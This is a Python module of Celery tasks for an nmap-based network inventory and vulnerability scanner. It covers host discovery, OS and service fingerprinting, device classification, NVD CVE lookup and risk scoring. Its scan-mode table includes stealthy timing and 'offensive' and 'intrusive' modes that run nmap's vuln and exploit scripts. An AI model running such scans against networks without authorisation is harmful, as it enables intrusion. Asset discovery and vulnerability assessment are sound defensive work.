import nmap3
import asyncio
import redis.asyncio as redis
import json
import structlog
from datetime import datetime
from typing import Dict, List, Any, Optional
from uuid import UUID
import subprocess
import re
from app.worker import celery_app
from app.config import get_settings
from app.database import AsyncSessionLocal
from app.models import Scan, Device, Vulnerability, DeviceVulnerability
from sqlalchemy import select
from sqlalchemy.orm import selectinload

settings = get_settings()
logger = structlog.get_logger()


SCAN_ARGUMENTS_BASE: Dict[str, str] = {
    "slow": "-sS -T0 --top-ports 50 --scan-delay 1000ms -O",           # slow & stealthy with OS
    "stealthy": "-sS -T1 --top-ports 200 -O",                          # quiet broader with OS
    "medium": "-sS -sV -T2 --top-ports 1000 -O --reason",              # service detect + OS
    "normal": "-sS -p- -T3 -sV -O --reason --osscan-guess",           # full TCP + OS guess
    "aggressive": "-sS -sU -p- -T4 -sV -O -A --script discovery",      # TCP+UDP+OS+scripts
    "offensive": "-sS -sU -p- -T4 -sV -O -A --script default,vuln,auth",  # deep probe
    "intrusive": "-sS -sU -p- -T5 -A --script default,vuln,exploit",   # full intrusive
}

# Fast enrichment arguments for individual device scanning
ENRICHMENT_ARGUMENTS_BASE: Dict[str, str] = {
    "slow": "-sS -T2 --top-ports 100 --osscan-limit --osscan-guess",
    "stealthy": "-sS -T2 --top-ports 200 --osscan-limit --osscan-guess",
    "medium": "-sS -sV -T3 --top-ports 500 --osscan-limit --osscan-guess",
    "normal": "-sS -sV -T4 --top-ports 1000 --osscan-limit --osscan-guess",
    "aggressive": "-sS -sV -T4 --top-ports 2000 --osscan-limit --osscan-guess",
    "offensive": "-sS -sV -T4 --top-ports 3000 --osscan-limit --osscan-guess",
    "intrusive": "-sS -sV -T5 --top-ports 5000 --osscan-limit --osscan-guess",
}

# Fallback arguments without OS detection for faster scanning
FALLBACK_ARGUMENTS_BASE: Dict[str, str] = {
    "slow": "-sS -sV -T3 --top-ports 100",
    "stealthy": "-sS -sV -T3 --top-ports 200",
    "medium": "-sS -sV -T4 --top-ports 500",
    "normal": "-sS -sV -T4 --top-ports 1000",
    "aggressive": "-sS -sV -T4 --top-ports 2000",
    "offensive": "-sS -sV -T4 --top-ports 3000",
    "intrusive": "-sS -sV -T5 --top-ports 5000",
}


def _apply_performance_tuning(arguments: Dict[str, str], tuning: Dict[str, str]) -> Dict[str, str]:
    tuned: Dict[str, str] = {}
    for mode, base_args in arguments.items():
        extra = tuning.get(mode, tuning.get("default", ""))
        tuned[mode] = f"{base_args} {extra}".strip()
    return tuned


SCAN_ARGUMENTS = _apply_performance_tuning(
    SCAN_ARGUMENTS_BASE,
    {
        "slow": "--max-retries 2 --host-timeout 120s --max-rtt-timeout 900ms",
        "stealthy": "--max-retries 2 --host-timeout 120s --max-rtt-timeout 800ms --min-parallelism 4",
        "medium": "--max-retries 1 --host-timeout 80s --max-rtt-timeout 600ms --min-rate 120",
        "default": "--max-retries 1 --host-timeout 70s --max-rtt-timeout 550ms --min-rate 180",
        "aggressive": "--max-retries 1 --host-timeout 60s --max-rtt-timeout 450ms --min-rate 220 --defeat-rst-ratelimit",
        "offensive": "--max-retries 1 --host-timeout 55s --max-rtt-timeout 420ms --min-rate 260 --defeat-rst-ratelimit",
        "intrusive": "--max-retries 1 --host-timeout 50s --max-rtt-timeout 400ms --min-rate 300 --defeat-rst-ratelimit",
    },
)

ENRICHMENT_ARGUMENTS = _apply_performance_tuning(
    ENRICHMENT_ARGUMENTS_BASE,
    {
        "slow": "--max-retries 2 --host-timeout 100s --max-rtt-timeout 800ms",
        "stealthy": "--max-retries 2 --host-timeout 100s --max-rtt-timeout 700ms --min-parallelism 4",
        "medium": "--max-retries 1 --host-timeout 75s --max-rtt-timeout 550ms --min-rate 150",
        "default": "--max-retries 1 --host-timeout 65s --max-rtt-timeout 500ms --min-rate 220",
        "aggressive": "--max-retries 1 --host-timeout 55s --max-rtt-timeout 450ms --min-rate 260 --defeat-rst-ratelimit",
        "offensive": "--max-retries 1 --host-timeout 50s --max-rtt-timeout 420ms --min-rate 320 --defeat-rst-ratelimit",
        "intrusive": "--max-retries 1 --host-timeout 45s --max-rtt-timeout 400ms --min-rate 360 --defeat-rst-ratelimit",
    },
)

FALLBACK_ARGUMENTS = _apply_performance_tuning(
    FALLBACK_ARGUMENTS_BASE,
    {
        "slow": "--max-retries 1 --host-timeout 85s --max-rtt-timeout 700ms",
        "stealthy": "--max-retries 1 --host-timeout 80s --max-rtt-timeout 650ms --min-parallelism 4",
        "medium": "--max-retries 1 --host-timeout 65s --max-rtt-timeout 500ms --min-rate 150",
        "default": "--max-retries 1 --host-timeout 55s --max-rtt-timeout 450ms --min-rate 220",
        "aggressive": "--max-retries 1 --host-timeout 50s --max-rtt-timeout 420ms --min-rate 260",
        "offensive": "--max-retries 1 --host-timeout 45s --max-rtt-timeout 400ms --min-rate 320",
        "intrusive": "--max-retries 1 --host-timeout 40s --max-rtt-timeout 380ms --min-rate 360",
    },
)


async def get_redis():
    """Get Redis connection"""
    return await redis.from_url(settings.redis_url, encoding="utf-8", decode_responses=True)


async def publish_progress(scan_id: str, percent: float, current_target: str, status: str):
    """Publish scan progress via Redis pub/sub"""
    r = await get_redis()
    message = {
        "type": "scan.progress",
        "data": {
            "scan_id": scan_id,
            "percent": percent,
            "current_target": current_target,
            "status": status,
        }
    }
    await r.publish(f"scan:{scan_id}", json.dumps(message))
    await r.aclose()


async def publish_log(scan_id: str, level: str, source: str, text: str):
    """Publish console log via Redis pub/sub"""
    r = await get_redis()
    message = {
        "type": "console.log",
        "data": {
            "timestamp": datetime.utcnow().isoformat(),
            "level": level,
            "source": source,
            "text": text,
        }
    }
    await r.publish(f"logs:{scan_id}", json.dumps(message))
    await r.aclose()


def calculate_risk_score(open_ports: List[Dict], vulnerabilities: List) -> float:
    """Calculate device risk score based on open ports and vulnerabilities"""
    score = 0.0
    
    # Points for open ports
    high_risk_ports = {21, 22, 23, 25, 445, 3389, 5900}
    for port in open_ports:
        port_num = port.get("port", 0)
        if port_num in high_risk_ports:
            score += 2.0
        else:
            score += 0.5
    
    # Points for vulnerabilities
    for vuln in vulnerabilities:
        severity = vuln.get("severity", "LOW")
        if severity == "CRITICAL":
            score += 10.0
        elif severity == "HIGH":
            score += 7.0
        elif severity == "MEDIUM":
            score += 4.0
        else:
            score += 1.0
    
    return min(score, 100.0)


def parse_nmap_output(nmap_output: str) -> Dict[str, Any]:
    """Fast parser for nmap output"""
    result: Dict[str, Any] = {
        'hostname': None,
        'os_info': None,
        'open_ports': [],
        'mac_address': None,
        'vendor': None,
        'device_type_hint': None,
    }

    os_candidates: List[str] = []
    lines = nmap_output.split('\n')

    for raw_line in lines:
        line = raw_line.strip()
        lower = line.lower()

        # Extract hostname
        if 'rdns record' in lower or 'hostname' in lower:
            match = re.search(r'(\S+\.\S+)', line)
            if match:
                result['hostname'] = match.group(1)

        # Extract MAC address and vendor
        if 'mac address:' in lower:
            match = re.search(r'MAC Address: ([A-F0-9:]{17})\s+\((.*?)\)', line, re.IGNORECASE)
            if match:
                result['mac_address'] = match.group(1)
                result['vendor'] = match.group(2)

        # Extract open ports with version info
        port_match = re.match(r'(\d+)/(tcp|udp)\s+open\s+(\S+)(?:\s+(.*))?', line)
        if port_match:
            port_info = {
                'port': int(port_match.group(1)),
                'protocol': port_match.group(2),
                'service': port_match.group(3),
                'state': 'open'
            }
            if port_match.group(4):  # Version info available
                port_info['version'] = port_match.group(4).strip()
            result['open_ports'].append(port_info)

        # Extract OS information from various hints
        if 'os details:' in lower:
            os_candidates.append(line.split(':', 1)[1].strip())
        elif line.startswith('Running:'):
            os_candidates.append(line.replace('Running:', '').strip())
        elif line.startswith('OS:'):
            os_candidates.append(line.replace('OS:', '').strip())
        elif line.startswith('Aggressive OS guesses:'):
            guesses = [g.strip() for g in line.split(':', 1)[1].split(',') if g.strip()]
            os_candidates.extend(guesses)
        elif line.startswith('OS guesses:'):
            guesses = [g.strip() for g in line.split(':', 1)[1].split(',') if g.strip()]
            os_candidates.extend(guesses)
        elif 'running (just guessing):' in lower:
            os_candidates.append(line.split(':', 1)[1].strip())

        # Capture service info hints
        if lower.startswith('service info:'):
            for segment in line.split(';'):
                seg_lower = segment.lower().strip()
                if seg_lower.startswith('os:'):
                    os_hint = segment.split(':', 1)[1].strip()
                    if os_hint:
                        os_candidates.append(os_hint)
                if seg_lower.startswith('device:') and not result['device_type_hint']:
                    result['device_type_hint'] = segment.split(':', 1)[1].strip()

        if lower.startswith('device type:') and not result['device_type_hint']:
            result['device_type_hint'] = line.split(':', 1)[1].strip()

        # Extract CPE based OS hints
        for cpe_match in re.findall(r'cpe:/o:([^\s]+)', line, re.IGNORECASE):
            parsed = parse_os_from_cpe(cpe_match)
            if parsed:
                os_candidates.append(parsed)

    if os_candidates:
        result['os_info'] = os_candidates[0]

    # If no OS detected, try to infer from services or vendor
    if not result['os_info'] and result['open_ports']:
        inferred = infer_os_from_services(result['open_ports'])
        if inferred:
            result['os_info'] = f"{inferred} (service fingerprint)"

    if not result['os_info'] and result['vendor']:
        vendor_guess = infer_os_from_vendor(result['vendor'])
        if vendor_guess:
            result['os_info'] = vendor_guess

    return result


def infer_os_from_services(open_ports: List[Dict]) -> Optional[str]:
    """Infer OS from open services when nmap OS detection fails"""
    services = [port.get('service', '').lower() for port in open_ports]
    versions = [port.get('version', '').lower() for port in open_ports]

    # Check for Windows-specific services
    if any(svc in services for svc in ['microsoft-ds', 'netbios-ssn', 'ms-wbt-server', 'kerberos-sec', 'msrpc', 'winrm']):
        return "Microsoft Windows"

    # Check for SSH version patterns
    for version in versions:
        if 'openssh' in version and 'ubuntu' in version:
            return "Linux Ubuntu"
        elif 'openssh' in version and ('debian' in version or 'raspbian' in version):
            return "Linux Debian"
        elif 'openssh' in version and 'centos' in version:
            return "Linux CentOS"
        elif 'dropbear' in version:
            return "Linux (Embedded)"

    # Port-based heuristics
    port_numbers = [port.get('port') for port in open_ports]
    if 548 in port_numbers or any('afp' in svc for svc in services):
        return "Apple macOS"
    if 62078 in port_numbers:
        return "Apple iOS"
    if 8291 in port_numbers or any('winbox' in version for version in versions):
        return "MikroTik RouterOS"
    if any('ubiquiti' in version or 'unifi' in version for version in versions):
        return "Ubiquiti Network Device"
    if any('synology' in version for version in versions):
        return "Synology NAS"

    # Check for web server patterns
    for version in versions:
        if 'apache' in version and 'ubuntu' in version:
            return "Linux Ubuntu"
        elif 'nginx' in version:
            return "Linux"
        elif 'iis' in version or 'microsoft' in version:
            return "Microsoft Windows"
    
    # Check for common Linux services
    if any(svc in services for svc in ['ssh', 'http', 'https', 'ftp']):
        return "Linux"

    return None


def parse_os_from_cpe(cpe: str) -> Optional[str]:
    """Translate a CPE entry to a readable OS string"""
    if not cpe:
        return None

    parts = cpe.split(':')
    if len(parts) < 2:
        return None

    vendor = parts[0].replace('_', ' ').title()
    product = parts[1].replace('_', ' ').title() if len(parts) > 1 else ''
    version = parts[2].replace('_', ' ') if len(parts) > 2 else ''

    if vendor.lower() == 'linux' and product.lower() == 'linux kernel':
        vendor = 'Linux'
        product = ''

    os_string = ' '.join(filter(None, [vendor, product, version])).strip()
    return os_string or None


def infer_os_from_vendor(vendor: Optional[str]) -> Optional[str]:
    if not vendor:
        return None

    vendor_lower = vendor.lower()
    if 'apple' in vendor_lower or 'mac' in vendor_lower:
        return "Apple ecosystem device (vendor fingerprint)"
    if 'cisco' in vendor_lower:
        return "Cisco network device (vendor fingerprint)"
    if 'ubiquiti' in vendor_lower or 'unifi' in vendor_lower:
        return "Ubiquiti network device (vendor fingerprint)"
    if 'mikrotik' in vendor_lower:
        return "MikroTik RouterOS (vendor fingerprint)"
    if 'hewlett' in vendor_lower or 'hp' in vendor_lower:
        return "HP device (vendor fingerprint)"
    if 'dell' in vendor_lower:
        return "Dell system (vendor fingerprint)"
    if 'lenovo' in vendor_lower:
        return "Lenovo system (vendor fingerprint)"
    if 'huawei' in vendor_lower:
        return "Huawei device (vendor fingerprint)"
    if 'zte' in vendor_lower:
        return "ZTE device (vendor fingerprint)"
    if 'vmware' in vendor_lower:
        return "VMware ESXi (vendor fingerprint)"

    return None


def detect_device_type(
    os_guess: Optional[str],
    vendor: Optional[str],
    hostname: Optional[str],
    open_ports: List[Dict],
    device_type_hint: Optional[str] = None,
) -> str:
    """Detect device type from OS information and other clues"""
    if device_type_hint:
        hint = device_type_hint.lower()
        if 'router' in hint or 'bridge' in hint or 'gateway' in hint:
            return "Router/Gateway"
        if 'switch' in hint:
            return "Network Switch"
        if 'firewall' in hint:
            return "Firewall"
        if 'general purpose' in hint or 'server' in hint:
            if os_guess and 'windows' in os_guess.lower():
                return "Windows Server"
            if os_guess and 'linux' in os_guess.lower():
                return "Linux Server"
            return "Server"
        if 'printer' in hint:
            return "Network Printer"
        if 'voip' in hint or 'phone' in hint:
            return "VoIP Phone"

    if not os_guess and not vendor and not hostname:
        return "Unknown"
    
    # Combine all strings for analysis
    combined = f"{os_guess or ''} {vendor or ''} {hostname or ''}".lower()
    
    # Mobile devices
    if any(x in combined for x in ['android', 'mobile', 'phone', 'smartphone']):
        if 'samsung' in combined:
            return "Samsung Android"
        elif 'google' in combined or 'pixel' in combined:
            return "Google Android"
        elif 'xiaomi' in combined or 'redmi' in combined:
            return "Xiaomi Android"
        elif 'huawei' in combined:
            return "Huawei Android"
        elif 'oneplus' in combined:
            return "OnePlus Android"
        return "Android Device"
    
    if any(x in combined for x in ['iphone', 'ios', 'ipad']):
        if 'ipad' in combined:
            return "Apple iPad"
        return "Apple iPhone"
    
    # Smart TVs and Streaming
    if any(x in combined for x in ['tv', 'television', 'smart tv']):
        if 'samsung' in combined:
            return "Samsung Smart TV"
        elif 'lg' in combined:
            return "LG Smart TV"
        elif 'sony' in combined:
            return "Sony TV"
        return "Smart TV"
    
    if any(x in combined for x in ['roku', 'chromecast', 'fire tv', 'apple tv']):
        if 'roku' in combined:
            return "Roku"
        elif 'chromecast' in combined:
            return "Google Chromecast"
        elif 'fire' in combined:
            return "Amazon Fire TV"
        elif 'apple tv' in combined:
            return "Apple TV"
    
    # Desktop/Laptop OS
    if any(x in combined for x in ['windows', 'microsoft']):
        if 'windows 11' in combined:
            return "Windows 11"
        elif 'windows 10' in combined:
            return "Windows 10"
        elif 'windows server' in combined:
            return "Windows Server"
        elif any(x in combined for x in ['windows 7', 'windows 8']):
            return "Windows (Legacy)"
        return "Windows PC"
    
    if any(x in combined for x in ['mac os', 'macos', 'darwin', 'osx', 'os x']):
        return "Apple macOS"
    
    if any(x in combined for x in ['linux', 'ubuntu', 'debian', 'fedora', 'centos', 'red hat', 'arch']):
        if 'ubuntu' in combined:
            return "Linux (Ubuntu)"
        elif 'debian' in combined:
            return "Linux (Debian)"
        elif 'fedora' in combined:
            return "Linux (Fedora)"
        elif 'centos' in combined or 'red hat' in combined:
            return "Linux (RHEL/CentOS)"
        elif 'arch' in combined:
            return "Linux (Arch)"
        return "Linux"
    
    # Network devices
    if any(x in combined for x in ['router', 'gateway', 'access point', 'ap ']):
        if 'cisco' in combined:
            return "Cisco Router"
        elif 'netgear' in combined:
            return "Netgear Router"
        elif 'tp-link' in combined or 'tplink' in combined:
            return "TP-Link Router"
        elif 'asus' in combined:
            return "ASUS Router"
        elif 'ubiquiti' in combined or 'unifi' in combined:
            return "Ubiquiti Router"
        return "Router/Gateway"
    
    # IoT and Smart Home
    if any(x in combined for x in ['alexa', 'echo']):
        return "Amazon Echo"
    if any(x in combined for x in ['google home', 'nest']):
        return "Google Home/Nest"
    if any(x in combined for x in ['smart speaker', 'speaker']):
        return "Smart Speaker"
    if any(x in combined for x in ['camera', 'webcam', 'surveillance']):
        return "IP Camera"
    if any(x in combined for x in ['printer', 'print server']):
        if 'hp' in combined:
            return "HP Printer"
        elif 'epson' in combined:
            return "Epson Printer"
        elif 'canon' in combined:
            return "Canon Printer"
        return "Network Printer"
    
    # Gaming
    if any(x in combined for x in ['playstation', 'ps4', 'ps5', 'sony interactive']):
        return "PlayStation"
    if any(x in combined for x in ['xbox', 'microsoft xbox']):
        return "Xbox"
    if any(x in combined for x in ['nintendo', 'switch']):
        return "Nintendo Switch"
    
    # Servers
    if 'server' in combined:
        return "Server"
    
    # NAS
    if any(x in combined for x in ['nas', 'synology', 'qnap', 'network storage']):
        if 'synology' in combined:
            return "Synology NAS"
        elif 'qnap' in combined:
            return "QNAP NAS"
        return "NAS Device"
    
    # Fallback to vendor or OS
    if vendor and vendor != "Unknown":
        return f"{vendor} Device"
    if os_guess:
        return os_guess[:50]  # Truncate long OS strings

    return "Unknown Device"


@celery_app.task(bind=True)
def nmap_scan(self, scan_id: str, targets: List[str], mode: str, options: Optional[Dict] = None):
    """Execute nmap scan task"""
    return asyncio.run(_nmap_scan_async(self, scan_id, targets, mode, options))


async def _nmap_scan_async(task, scan_id: str, targets: List[str], mode: str, options: Optional[Dict]):
    """Async nmap scan implementation"""
    async with AsyncSessionLocal() as db:
        try:
            # Update scan status to running
            result = await db.execute(select(Scan).where(Scan.id == UUID(scan_id)))
            scan = result.scalar_one_or_none()
            if not scan:
                return {"error": "Scan not found"}
            
            scan.status = "running"
            await db.commit()
            
            await publish_log(scan_id, "INFO", "scanner", f"Starting scan for targets: {', '.join(targets)}")
            
            # Configure nmap based on mode with better host discovery
            nm = nmap3.Nmap()
            total_targets = len(targets)
            for idx, target in enumerate(targets):
                try:
                    await publish_progress(
                        scan_id,
                        (idx / total_targets) * 30,  # 0-30% for host discovery
                        target,
                        "discovering"
                    )
                    
                    await publish_log(scan_id, "INFO", "scanner", f"Scanning target: {target}")
                    
                    # First do host discovery to find all alive hosts
                    await publish_log(scan_id, "INFO", "scanner", f"Performing host discovery on: {target}")
                    
                    # Use comprehensive host discovery with root privileges
                    discovery_cmd = [
                        "nmap", "-sn",
                        "-PS21,22,23,25,53,80,110,135,139,143,443,993,995,1723,3389,5900,8080",
                        "-PA21,22,23,25,53,80,110,135,139,143,443,993,995,1723,3389,5900,8080",
                        "-PU53,135,137,161,500,631,1434,5353",
                        "-PE", "-PP", "-n", "-T4",
                        "--max-retries", "1",
                        "--host-timeout", "45s",
                        "--max-rtt-timeout", "500ms",
                        "--min-parallelism", "16",
                        target
                    ]
                    discovery_result = subprocess.run(
                        discovery_cmd,
                        capture_output=True,
                        text=True,
                        timeout=120
                    )

                    if discovery_result.returncode not in (0,):
                        stderr_text = (discovery_result.stderr or '').strip()
                        await publish_log(
                            scan_id,
                            "WARN",
                            "scanner",
                            f"Host discovery completed with return code {discovery_result.returncode}: {stderr_text or 'no stderr'}",
                        )

                    # Parse discovery results and create initial device records
                    discovered_devices = {}
                    current_ip = None
                    current_mac = None
                    current_vendor = None
                    
                    for line in discovery_result.stdout.split('\n'):
                        line = line.strip()
                        
                        # Parse host IP
                        if 'Nmap scan report for' in line:
                            if '(' in line and ')' in line:
                                # Format: "Nmap scan report for hostname (10.0.0.1)"
                                ip_match = re.search(r'\(([0-9.]+)\)', line)
                                if ip_match:
                                    current_ip = ip_match.group(1)
                            else:
                                # Format: "Nmap scan report for 10.0.0.1"  
                                parts = line.split()
                                if len(parts) >= 5:
                                    ip = parts[4]
                                    if re.match(r'^[0-9.]+$', ip):
                                        current_ip = ip
                            current_mac = None
                            current_vendor = None
                        
                        # Parse MAC address and vendor
                        elif 'MAC Address:' in line and current_ip:
                            mac_match = re.search(r'MAC Address: ([A-F0-9:]{17})', line)
                            if mac_match:
                                current_mac = mac_match.group(1)
                                # Extract vendor info if present
                                vendor_match = re.search(r'\(([^)]+)\)', line)
                                if vendor_match:
                                    current_vendor = vendor_match.group(1)
                        
                        # Store device info when we have complete info or at end of host block
                        if current_ip and (current_mac or line == '' or 'Nmap scan report for' in line):
                            if current_ip not in discovered_devices:
                                discovered_devices[current_ip] = {
                                    'ip': current_ip,
                                    'mac_address': current_mac,
                                    'vendor': current_vendor
                                }
                    
                    await publish_log(scan_id, "INFO", "scanner", f"Found {len(discovered_devices)} alive hosts")
                    
                    # Create initial device records immediately after host discovery
                    created_devices = []
                    for ip, device_info in discovered_devices.items():
                        try:
                            # Check if device already exists for this scan
                            existing_result = await db.execute(
                                select(Device).where(
                                    (Device.scan_id == UUID(scan_id)) & (Device.ip == ip)
                                )
                            )
                            existing_device = existing_result.scalar_one_or_none()
                            
                            if not existing_device:
                                # Create initial device record
                                device = Device(
                                    scan_id=UUID(scan_id),
                                    ip=ip,
                                    mac_address=device_info['mac_address'],
                                    vendor=device_info['vendor'],
                                    device_type=detect_device_type(None, device_info.get('vendor'), None, []),
                                    open_ports=[],
                                    risk_score=0.0
                                )
                                db.add(device)
                                await db.flush()
                                created_devices.append((device.id, ip))
                                await publish_log(scan_id, "INFO", "scanner", f"Discovered device: {ip} ({device_info['vendor'] or 'Unknown vendor'})")
                        except Exception as e:
                            await publish_log(scan_id, "ERROR", "scanner", f"Error creating initial device record for {ip}: {str(e)}")
                    
                    await db.commit()
                    
                    # Start asynchronous OS detection for each discovered device
                    for device_id, ip in created_devices:
                        try:
                            # Start individual device enrichment task
                            from app.tasks import enrich_device_task
                            enrich_device_task.apply_async(
                                args=[scan_id, str(device_id), ip, mode],
                                countdown=1  # Small delay to ensure DB commit
                            )
                            await publish_log(scan_id, "DEBUG", "scanner", f"Queued enrichment for {ip}")
                        except Exception as e:
                            await publish_log(scan_id, "ERROR", "scanner", f"Error queuing enrichment for {ip}: {str(e)}")
                    
                    # Log the discovered hosts for debugging
                    if discovered_devices:
                        host_list = list(discovered_devices.keys())
                        await publish_log(scan_id, "DEBUG", "scanner", f"Discovered hosts: {', '.join(host_list)}")
                    
                    # Now enrich each discovered device with detailed scanning
                    scan_targets = list(discovered_devices.keys()) if discovered_devices else [target]
                    
                    # Update progress after host discovery phase - enrichment happens asynchronously  
                    await publish_progress(
                        scan_id,
                        50 + (idx / total_targets) * 40,  # 50-90% for discovery completion
                        f"Found {len(scan_targets)} devices, enriching...",
                        "profiling"
                    )
                            
                except Exception as e:
                    await publish_log(scan_id, "ERROR", "scanner", f"Error scanning {target}: {str(e)}")
                    logger.error("scan_error", target=target, error=str(e))
            
            # Finalize scan
            await publish_progress(scan_id, 100, "", "done")
            
            # Update scan status
            result = await db.execute(
                select(Scan)
                .where(Scan.id == UUID(scan_id))
                .options(selectinload(Scan.devices))
            )
            scan = result.scalar_one()
            scan.status = "done"
            scan.finished_at = datetime.utcnow()
            scan.progress_percent = 100.0
            
            # Count results
            device_count = len(scan.devices)
            vuln_result = await db.execute(
                select(Vulnerability)
                .join(DeviceVulnerability)
                .join(Device)
                .where(Device.scan_id == UUID(scan_id))
            )
            vuln_count = len(vuln_result.scalars().unique().all())
            
            scan.result_summary = {
                "hosts_found": device_count,
                "vulns_found": vuln_count,
            }
            
            await db.commit()
            await publish_log(scan_id, "INFO", "scanner", f"Scan completed. Found {device_count} hosts, {vuln_count} vulnerabilities")
            
            return {
                "scan_id": scan_id,
                "status": "done",
                "hosts_found": device_count,
                "vulns_found": vuln_count,
            }
            
        except Exception as e:
            logger.error("scan_failed", scan_id=scan_id, error=str(e))
            # Try to update scan status if scan object exists
            try:
                result = await db.execute(select(Scan).where(Scan.id == UUID(scan_id)))
                scan = result.scalar_one_or_none()
                if scan:
                    scan.status = "error"
                    scan.error_message = str(e)
                    scan.finished_at = datetime.utcnow()
                    await db.commit()
            except:
                pass
            await publish_log(scan_id, "ERROR", "scanner", f"Scan failed: {str(e)}")
            raise


async def lookup_vulnerabilities(db, device: Device, open_ports: List[Dict]) -> List[Dict]:
    """Look up CVEs for device services"""
    vulnerabilities = []
    
    # Check cache first
    r = await get_redis()
    
    try:
        import nvdlib
        
        for port_info in open_ports:
            service = port_info.get("service", "")
            version = port_info.get("version", "")
            product = port_info.get("product", "")
            
            if not product and not service:
                continue
            
            # Create search query
            search_term = f"{product} {version}" if product else f"{service} {version}"
            search_term = search_term.strip()
            
            # Check cache
            cache_key = f"cve:{search_term}"
            cached = await r.get(cache_key)
            if cached:
                cve_data = json.loads(cached)
                vulnerabilities.extend(cve_data)
                continue
            
            # Query NVD
            try:
                cves = nvdlib.searchCVE(keywordSearch=search_term, limit=10)
                cve_list = []
                
                for cve in cves:
                    # Check if vulnerability already exists
                    result = await db.execute(
                        select(Vulnerability).where(Vulnerability.cve == cve.id)
                    )
                    vuln = result.scalar_one_or_none()
                    
                    if not vuln:
                        # Create new vulnerability
                        severity = "LOW"
                        cvss_score = None
                        
                        if hasattr(cve, "v31score") and cve.v31score:
                            cvss_score = cve.v31score
                            if cvss_score >= 9.0:
                                severity = "CRITICAL"
                            elif cvss_score >= 7.0:
                                severity = "HIGH"
                            elif cvss_score >= 4.0:
                                severity = "MEDIUM"
                        elif hasattr(cve, "v2score") and cve.v2score:
                            cvss_score = cve.v2score
                            if cvss_score >= 9.0:
                                severity = "CRITICAL"
                            elif cvss_score >= 7.0:
                                severity = "HIGH"
                            elif cvss_score >= 4.0:
                                severity = "MEDIUM"
                        
                        vuln = Vulnerability(
                            cve=cve.id,
                            severity=severity,
                            cvss_score=cvss_score,
                            summary=cve.descriptions[0].value if cve.descriptions else None,
                            references=[ref.url for ref in cve.references] if cve.references else [],
                            published_date=cve.published if hasattr(cve, "published") else None,
                        )
                        db.add(vuln)
                        await db.flush()
                    
                    # Link vulnerability to device
                    link = DeviceVulnerability(
                        device_id=device.id,
                        vulnerability_id=vuln.id,
                        affected_service=f"{service} {version}".strip(),
                    )
                    db.add(link)
                    
                    cve_list.append({
                        "cve": vuln.cve,
                        "severity": vuln.severity,
                        "cvss_score": vuln.cvss_score,
                    })
                
                # Cache results
                await r.setex(cache_key, settings.cve_cache_ttl, json.dumps(cve_list))
                vulnerabilities.extend(cve_list)
                
            except Exception as e:
                logger.warning("cve_lookup_failed", service=search_term, error=str(e))
    
    except ImportError:
        logger.warning("nvdlib_not_available", message="Install nvdlib for vulnerability scanning")
    
    finally:
        await r.aclose()
    
    return vulnerabilities


@celery_app.task(bind=True)
def enrich_device_task(self, scan_id: str, device_id: str, ip: str, mode: str):
    """Enrich a single device with OS detection and port scanning"""
    return asyncio.run(_enrich_device_async(self, scan_id, device_id, ip, mode))


async def _enrich_device_async(task, scan_id: str, device_id: str, ip: str, mode: str):
    """Async device enrichment implementation"""
    async with AsyncSessionLocal() as db:
        try:
            # Get device record
            result = await db.execute(select(Device).where(Device.id == UUID(device_id)))
            device = result.scalar_one_or_none()
            if not device:
                return {"error": "Device not found"}
            
            await publish_log(scan_id, "INFO", "enricher", f"Starting enrichment for {ip}")
            
            # Try OS detection first, fallback to service detection if it fails
            enrichment_args = ENRICHMENT_ARGUMENTS.get(mode, ENRICHMENT_ARGUMENTS["normal"])
            nmap_cmd = ["nmap"] + enrichment_args.split() + [ip]
            
            await publish_log(scan_id, "DEBUG", "enricher", f"Running: {' '.join(nmap_cmd)}")
            
            nmap_result = subprocess.run(
                nmap_cmd,
                capture_output=True,
                text=True,
                timeout=75  # quicker OS detection with tuned args
            )

            host_data = None

            if nmap_result.returncode == 0 or nmap_result.stdout:
                host_data = parse_nmap_output(nmap_result.stdout)
                if nmap_result.returncode == 0:
                    await publish_log(scan_id, "DEBUG", "enricher", f"OS scan successful for {ip}")
                else:
                    await publish_log(scan_id, "WARN", "enricher", f"OS scan returned code {nmap_result.returncode} for {ip}, using partial output")
            else:
                # Fallback to faster service detection without OS
                await publish_log(scan_id, "INFO", "enricher", f"OS detection failed for {ip}, trying service detection")
                fallback_args = FALLBACK_ARGUMENTS.get(mode, FALLBACK_ARGUMENTS["normal"])
                fallback_cmd = ["nmap"] + fallback_args.split() + [ip]

                fallback_result = subprocess.run(
                    fallback_cmd,
                    capture_output=True,
                    text=True,
                    timeout=45  # quicker service detection
                )

                if fallback_result.returncode == 0 or (fallback_result.stdout and fallback_result.stdout.strip()):
                    host_data = parse_nmap_output(fallback_result.stdout)
                    if fallback_result.returncode == 0:
                        await publish_log(scan_id, "INFO", "enricher", f"Service scan successful for {ip}")
                    else:
                        await publish_log(scan_id, "WARN", "enricher", f"Service scan returned code {fallback_result.returncode} for {ip}, using partial output")
                else:
                    await publish_log(scan_id, "WARN", "enricher", f"Both scans failed for {ip}")
                    return {"error": "Both OS and service detection failed"}
            
            if not host_data:
                await publish_log(scan_id, "WARN", "enricher", f"No scan data for {ip}")
                return {"error": "No scan data available"}
            
            # Extract enriched information from parsed data
            hostname = host_data.get('hostname')
            os_guess = host_data.get('os_info')
            open_ports = host_data.get('open_ports', [])
            mac_address = host_data.get('mac_address')
            vendor = host_data.get('vendor')
            
            # Update device with enriched information
            device.hostname = hostname or device.hostname
            device.os_guess = os_guess or device.os_guess
            device.open_ports = open_ports if open_ports else device.open_ports
            
            # Update MAC and vendor if we got better info
            if mac_address and not device.mac_address:
                device.mac_address = mac_address
            if vendor and not device.vendor:
                device.vendor = vendor
            
            # Re-detect device type with enriched data
            new_device_type = detect_device_type(
                os_guess or device.os_guess,
                device.vendor or vendor,
                hostname,
                open_ports,
                host_data.get('device_type_hint'),
            )
            if new_device_type and (
                not device.device_type
                or 'unknown' in device.device_type.lower()
                or new_device_type != "Unknown Device"
            ):
                device.device_type = new_device_type
            
            await db.commit()
            
            await publish_log(scan_id, "INFO", "enricher", f"Enriched {device.device_type}: {ip} ({len(open_ports)} open ports)")
            
            # Lookup CVEs asynchronously
            if open_ports:
                await publish_log(scan_id, "INFO", "cve_lookup", f"Looking up vulnerabilities for {ip}")
                vulns = await lookup_vulnerabilities(db, device, open_ports)
                device.risk_score = calculate_risk_score(open_ports, vulns)
                await db.commit()
            
            return {
                "device_id": device_id,
                "ip": ip,
                "os_guess": os_guess,
                "open_ports_count": len(open_ports),
                "device_type": device.device_type
            }
            
        except subprocess.TimeoutExpired:
            await publish_log(scan_id, "WARN", "enricher", f"Enrichment timeout for {ip}")
            return {"error": "Timeout"}
